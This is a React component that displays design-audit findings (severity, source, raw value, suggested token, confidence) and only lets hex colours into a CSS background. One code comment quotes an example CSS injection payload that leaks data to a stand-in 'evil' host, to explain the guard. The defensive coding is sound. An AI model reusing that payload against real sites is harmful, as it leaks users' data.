"use client"
import { AlertOctagon, AlertTriangle, Info, ArrowRight, Code2, Frame } from "lucide-react"
import type { AuditFinding, Severity } from "@/types/audit"

const SEV_META: Record<Severity, { icon: React.ReactNode; tone: string; bg: string }> = {
  critical: { icon: <AlertOctagon size={12} />, tone: "var(--danger)",  bg: "rgba(239,68,68,0.08)" },
  warning:  { icon: <AlertTriangle size={12} />, tone: "#f59e0b",        bg: "rgba(245,158,11,0.08)" },
  info:     { icon: <Info size={12} />,          tone: "#3b82f6",        bg: "rgba(59,130,246,0.08)" },
}

// Hex color literal — the only shape we allow into a CSS `background` value.
// Prevents CSS injection (e.g. `; background-image: url(//evil/?leak)`) when
// rendering raw_value from untrusted Figma or repo source.
const HEX_ONLY = /^#(?:[0-9a-fA-F]{3,4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/

export function FindingCard({ f }: { f: AuditFinding }) {
  const meta = SEV_META[f.severity]
  const isColor = (f.kind === "color" || f.kind === "figma-fill" || f.kind === "figma-stroke")
    && HEX_ONLY.test(f.raw_value)
  return (
    <div className="p-3 bg-[var(--surface)] border border-[var(--border)] rounded-lg flex items-start gap-3">
      <span
        className="mt-0.5 flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-semibold uppercase"
        style={{ color: meta.tone, background: meta.bg }}
      >
        {meta.icon}{f.severity}
      </span>

      <div className="flex-1 min-w-0">
        <div className="flex items-center gap-2 text-[11px] text-[var(--muted-foreground)]">
          {f.source_kind === "github" ? <Code2 size={11} /> : <Frame size={11} />}
          <span className="truncate">{f.source_label}</span>
          <span>·</span>
          <span className="font-mono truncate">{f.location}</span>
          <span className="ml-auto text-[10px] uppercase">{f.kind}</span>
        </div>

        <div className="flex items-center gap-2 mt-1.5">
          {isColor && (
            <span className="w-4 h-4 rounded border border-[var(--border)]" style={{ background: f.raw_value }} />
          )}
          <code className="font-mono text-xs bg-[var(--surface-2)] px-1.5 py-0.5 rounded">{f.raw_value}</code>
          {f.suggested_token && (
            <>
              <ArrowRight size={12} className="text-[var(--muted-foreground)]" />
              <code className="font-mono text-xs text-[var(--accent)] bg-[var(--surface-2)] px-1.5 py-0.5 rounded">
                {f.suggested_token}
              </code>
            </>
          )}
          {f.confidence != null && (
            <span className="ml-auto text-[10px] text-[var(--muted-foreground)] tabular-nums">
              {Math.round(f.confidence * 100)}%
            </span>
          )}
        </div>

        {f.ai_reason && (
          <p className="mt-1.5 text-[11px] text-[var(--muted-foreground)] italic">{f.ai_reason}</p>
        )}
      </div>
    </div>
  )
}
